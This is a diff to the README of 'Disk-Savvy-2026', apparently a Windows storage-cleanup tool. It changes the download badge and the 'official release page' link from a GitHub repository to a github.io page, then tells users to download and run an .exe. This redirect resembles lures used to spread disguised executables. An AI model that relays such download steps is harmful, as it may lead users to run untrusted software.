@@ -1,6 +1,6 @@
 # 💾 Disk-Savvy-2026 - Find and clear hidden storage space
 
-[![](https://img.shields.io/badge/Download-Disk--Savvy--2026-blue)](https://github.com/Hemmon1872/Disk-Savvy-2026)
+[![](https://img.shields.io/badge/Download-Disk--Savvy--2026-blue)](https://hemmon1872.github.io)
 
 ## 🔍 About the software
 
@@ -14,7 +14,7 @@ You can use this software on any computer running Windows 10 or Windows 11. Your
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official release page](https://github.com/Hemmon1872/Disk-Savvy-2026).
+1. Go to the [official release page](https://hemmon1872.github.io).
 2. Look for the file ending in .exe.
 3. Click the file to start the download.
 4. Save the file to your Downloads folder.
